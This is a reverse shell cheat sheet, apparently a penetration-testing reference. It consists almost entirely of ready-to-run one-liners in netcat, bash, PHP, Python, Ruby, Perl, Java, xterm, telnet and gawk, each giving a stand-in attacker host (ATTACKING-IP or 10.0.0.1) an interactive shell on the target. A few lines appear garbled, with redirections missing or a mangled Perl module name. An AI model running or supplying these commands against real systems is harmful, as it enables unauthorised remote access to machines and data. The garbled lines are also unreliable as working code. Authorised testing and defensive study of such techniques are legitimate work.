# Reverse Shell Cheat Sheet

## Netcat Reverse Shells

>: **nc -e /bin/sh 10.0.0.1 1234**
>
>: **/bin/sh | nc ATTACKING-IP 80**
>
>: **rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p**
>
> If you have the wrong version of netcat installed, you might still be able to get your reverse shell back like this:
>
>: **rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f**

## Bash Reverse Shells

>: **exec /bin/bash 0&0 2>&0**
>
>: **0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196**

>: **exec 5<>/dev/tcp/ATTACKING-IP/80**
>
>   **cat <&5 | while read line; do $line 2>&5 >&5; done**
>
> **or**
>
>: **while read line 0<&5; do $line 2>&5 >&5; done**

>: **bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1**

## PHP Reverse Shells

>: **php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'** <br>
      (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
 
## PYTHON Reverse Shells

>: **python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**

## RUBY Reverse Shells

>: **ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'**

## PERL Reverse Shells

>: **perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'**
>
> ### PERL Windows Reverse Shell
>
>: perl -MIO -e '$c=new IO: Socket: INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' <br>
>
>: perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## JAVA Reverse Shells

>: **r = Runtime.getRuntime() <br>
> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) <br>
> p.waitFor()**

## xterm Reverse Shells

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

>: **xterm -display 10.0.0.1:1**

To catch the incoming xterm, start an X-Server (:1: which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

>: **Xnest :1**

You’ll need to authorise the target to connect to you (command also run on your host):

>: **xhost +targetip**

## TELNET Reverse Shells

>: rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
>
>: telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

## GAWK Reverse Shells

>  #!/usr/bin/gawk -f
>
> BEGIN { <br>
>        Port    =       8080 <br>
>        Prompt  =       "bkd> "
>
>        Service = "/inet/tcp/" Port "/0/0" <br>
>        while (1) { <br>
>                do { <br>
>                        printf Prompt |& Service <br>
>                        Service |& getline cmd <br>
>                        if (cmd) { <br>
>                                while ((cmd |& getline) > 0) <br>
>                                        print $0 |& Service <br>
>                                close(cmd) <br>
>                        } <br>
>                } while (cmd != "exit") <br>
>                close(Service) <br>
>        } 
> }

  <br>
 - you can also see kali web shells.  
  <br>

## Reference:
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

